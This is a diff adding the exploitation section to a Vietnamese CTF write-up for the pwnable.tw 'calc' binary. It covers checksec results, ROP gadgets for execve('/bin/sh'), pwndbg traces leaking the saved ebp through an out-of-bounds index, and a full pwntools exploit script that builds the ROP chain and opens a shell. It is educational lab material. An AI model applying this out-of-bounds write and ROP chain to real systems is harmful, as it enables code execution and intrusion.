@@ -436,7 +436,196 @@ v1[v3 + 1] = num;
 <p>nên là lúc này nghiễm nhiên v1[10] được tăng thêm 1 đơn vị
 và lúc print ra thì in cái v1[v1[0]] thì in cái giá trị v1[10 ra] tức là in cái  giá trị ta đã thay đổi rồi ra.</p>
 <p>úi dồi ôi </p>
-<p>Còn phần exploit, tui đi gym về rồi viết tiếp </p>
+<h2 id="oke-sau-phần-re-thì-giờ-ta-sẽ-tiến-hành-khai-thác"><a class="header" href="#oke-sau-phần-re-thì-giờ-ta-sẽ-tiến-hành-khai-thác">OKE, sau phần re thì giờ ta sẽ tiến hành khai thác</a></h2>
+<pre><code class="language-shell">hjn4@LAPTOP-TEHHNDTG:/mnt/d/pwn_myself/pwnable_tw/calc$ checksec calc
+[*] '/mnt/d/pwn_myself/pwnable_tw/calc/calc'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>Với check file như này, có canary, nx enable, cộng với việc ta có thể leak và write tùy ý thì có lẽ không write shellcode rồi call về đấy để thực thi được tại </p>
+<blockquote>
+<p>vì khi mà nx được bật thì khi load chương trình vào bộ nhớ, sẽ không cho phép 1 vùng nhớ nào đó có cả 2 quyền writeable và executable. </p>
+<p>Vùng .text chứa code chỉ có thể execute mà không thể write, các vùng như stack, heap, data, bss chứa dữ liệu thì có thể write nhưng không thể execute. </p>
+<p>Do đó ta không thể khai thác theo hướng chèn shellcode vào stack và cho return address trỏ về shellcode được.</p>
+</blockquote>
+<p>Giờ ta sẽ hướng đến ROP, nãy mình check thì thấy quá tr gadget :)), nên là maybe ta có thể làm gì đó với mớ tài nguyên này.</p>
+<pre><code class="language-python">
+0x0805c34b : pop eax ; ret
+0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret
+0x08049a21 : int 0x80
+
+</code></pre>
+<p>Với nhiêu đây thì ta có thể gọi execve() rồi nhợ :3</p>
+<ul>
+<li>eax = 0x0b</li>
+<li>ebx = address of &quot;/bin/sh&quot;</li>
+<li>ecx = edx = \x00</li>
+</ul>
+<p>Vậy thì làm sao để mà thực thi được các gadget mà ta inject vào. Đó là lúc t cần previous_ebp, tức là ebp của hàm main, and why?, sau khi thực thi xong calc =&gt; quay về hàm main, lúc quay về này nó sẽ tiến hành thực hiện các gadget của chúng ta ngay sau ebp hàm main, thay vì exit(). Nai xừ.</p>
+<p>Oke giờ ta sẽ đi leak prev_ebp</p>
+<p>Đặt breakpoint và ta có :</p>
+<pre><code class="language-shell">pwndbg&gt;
+0x08049382 in calc ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
+ EAX  0x0
+ EBX  0x80481b0 (_init) ◂— push ebx
+ ECX  0x80ed4d4 (_IO_stdfile_1_lock) ◂— 0x0
+ EDX  0x0
+ EDI  0x80ec00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069120 (__stpcpy_sse2) ◂— mov edx, dword ptr [esp + 4]
+ ESI  0x0
+ EBP  0xffffd218 —▸ 0xffffd238 —▸ 0x8049c30 (__libc_csu_fini) ◂— push ebx
+*ESP  0xffffcc60 ◂— 0x0
+*EIP  0x8049382 (calc+9) ◂— mov eax, dword ptr gs:[0x14]
+───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
+   0x8049379 &lt;calc&gt;       push   ebp
+   0x804937a &lt;calc+1&gt;     mov    ebp, esp
+   0x804937c &lt;calc+3&gt;     sub    esp, 0x5b8
+ ► 0x8049382 &lt;calc+9&gt;     mov    eax, dword ptr gs:[0x14]
+   0x8049388 &lt;calc+15&gt;    mov    dword ptr [ebp - 0xc], eax
+</code></pre>
+<p>Lúc này ở hàm calc, ebp_calc =&gt; ebp_main. nên là ta tính được offset giữa 2 thằng là 32. thêm nữa:</p>
+<pre><code class="language-c">unsigned int calc()
+{
+  int v1[101]; // [esp+18h] [ebp-5A0h] BYREF
+  char s[1024]; // [esp+1ACh] [ebp-40Ch] BYREF
+  unsigned int v3; // [esp+5ACh] [ebp-Ch]
+  ....
+
+</code></pre>
+<p>Cùng nhìn lại trong hàm calc là có khai báo biến v1[] tại địa chỉ <strong>ebp - 5A0</strong></p>
+<p>Mà 5A0 = 360, tức là v1[0] có địa chỉ là = <strong>ebp-360</strong>, Vậy thì v1[360] = ebp_ebp. ta sẽ leak thử xem sao.</p>
+<p>Và quả thật như vậy </p>
+<pre><code class="language-shell">───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
+ ► 0x80493ed &lt;calc+116&gt;    call   parse_expr                     &lt;parse_expr&gt;
+        arg[0]: 0xffffce0c ◂— '+360'
+        arg[1]: 0xffffcc78 ◂— 0x0
+        arg[2]: 0x0
+        arg[3]: 0x0
+
+   0x80493f2 &lt;calc+121&gt;    test   eax, eax
+   0x80493f4 &lt;calc+123&gt;    je     calc+175                     &lt;calc+175&gt;
+
+   0x80493f6 &lt;calc+125&gt;    mov    eax, dword ptr [ebp - 0x5a0]
+   0x80493fc &lt;calc+131&gt;    sub    eax, 1
+   0x80493ff &lt;calc+134&gt;    mov    eax, dword ptr [ebp + eax*4 - 0x59c]
+   0x8049406 &lt;calc+141&gt;    mov    dword ptr [esp + 4], eax
+   0x804940a &lt;calc+145&gt;    mov    dword ptr [esp], 0x80bf804
+   0x8049411 &lt;calc+152&gt;    call   printf                     &lt;printf&gt;
+
+   0x8049416 &lt;calc+157&gt;    mov    eax, dword ptr [stdout]       &lt;0x80ec4c0&gt;
+   0x804941b &lt;calc+162&gt;    mov    dword ptr [esp], eax
+───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
+00:0000│ esp 0xffffcc60 —▸ 0xffffce0c ◂— '+360'
+01:0004│     0xffffcc64 —▸ 0xffffcc78 ◂— 0x0
+02:0008│     0xffffcc68 ◂— 0x0
+... ↓        5 skipped
+─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
+ ► 0 0x80493ed calc+116
+   1 0x8049499 main+71
+   2 0x804967a __libc_start_main+458
+   3 0x8048d4b _start+33
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg&gt; c
+Continuing.
+-11720
+
+</code></pre>
+<p>Đổi --11720 =&gt; hex = 0xffffd238 = ebp_main</p>
+<p>Mình show stack cho dễ hình dung chỗ này, thế quái nào mình cần gần 2 tiếng ở đây...</p>
+<div class="table-wrapper"><table><thead><tr><th>return address</th></tr></thead><tbody>
+<tr><td>ebp main func</td></tr>
+<tr><td>...</td></tr>
+<tr><td>...</td></tr>
+<tr><td>v1[1]</td></tr>
+<tr><td>v1[0]</td></tr>
+</tbody></table>
+</div>
+<p><strong>0x5A0 = 1440 = 360*4, với mảng kiểu int kiến trúc x86 =&gt; mỗi stack ứng với 4bytes =&gt; offset = 360</strong></p>
+<p>Đây chính là lý do mà v[360] =&gt; giá trị ebp main = prev_ebp</p>
+<p>Return address ngay trên prev_ebp =&gt; offset là 361, do đó từ offset 361 trở đi ta sẽ tiến hành ghi các gadgets.</p>
+<p>Cụ thể ta sẽ set up stack như sau </p>
+<div class="table-wrapper"><table><thead><tr><th>offset</th><th>inject</th></tr></thead><tbody>
+<tr><td>778</td><td>&quot;//sh&quot;</td></tr>
+<tr><td>777</td><td>&quot;/bin&quot;</td></tr>
+<tr><td>...</td><td>...</td></tr>
+<tr><td>...</td><td>...</td></tr>
+<tr><td>367</td><td>int 0x80</td></tr>
+<tr><td>366</td><td>address of &quot;/bin//sh&quot;</td></tr>
+<tr><td>365</td><td>0x00</td></tr>
+<tr><td>364</td><td>0x00</td></tr>
+<tr><td>363</td><td>pop_edx_ecx_ebx_ret</td></tr>
+<tr><td>362</td><td>0x0b</td></tr>
+<tr><td>361</td><td>pop_eax_ret</td></tr>
+<tr><td>360</td><td>prev_ebp</td></tr>
+</tbody></table>
+</div>
+<h3 id="exploit"><a class="header" href="#exploit">Exploit</a></h3>
+<pre><code class="language-python">from pwn import *
+
+sh = 0x68732f2f
+bin = 0x6e69622f
+
+offset_ebp = 32
+
+def toInt(s):
+    s = s.strip()
+    if not s.startswith(b'-'):
+        return int(s)
+    else:
+        return (int(s[1:]) ^ 0xffffffff) + 1
+
+def toStr(ori, new):
+    if hex(new).startswith('0xf'):
+        new = int('-' + str((new ^ 0xffffffff) + 1))
+    if new &gt; ori:
+        return '+' + str(new - ori)
+    elif new &lt; ori:
+        return '-' + str(ori - new)
+    else:
+        return ''
+
+s = process('./calc')
+#s = remote('chall.pwnable.tw', 10100)
+#gdb.attach(s, api=True)
+print(s.recvuntil('\n'))
+
+s.sendline('+777')
+s.sendline('+777' + toStr(toInt(s.recvuntil('\n')), bin))
+print(s.recvuntil('\n'))
+
+s.sendline('+778')
+s.sendline('+778' + toStr(toInt(s.recvuntil('\n')), sh))
+print(s.recvuntil('\n'))
+
+s.sendline('+360')
+prev_ebp = s.recvuntil('\n')
+prev_ebp = toInt(prev_ebp)
+
+ebp = prev_ebp - offset_ebp
+print('ebp calc:', hex(ebp))
+
+rop_gadgets = [
+    (0x0805c34b, 'pop eax'),
+    (0xb, 'value for eax (0xb)'),
+    (0x080701d0, 'pop edx ecx ebx'),
+    (0, 'value for edx (0)'),
+    (0, 'value for ecx (0)'),
+    (ebp + (777 - 360) * 4, 'address of &quot;/bin//sh&quot;'), 
+    (0x08049a21, 'int 0x80')
+]
+for line_num, (addr, desc) in enumerate(rop_gadgets, start=361):
+    s.sendline(f'+{line_num}')
+    s.sendline(f'+{line_num}' + toStr(toInt(s.recvuntil('\n')), addr))
+    print(s.recvuntil('\n'))
+
+
+s.interactive()
+
+</code></pre>
 
                     </main>
 
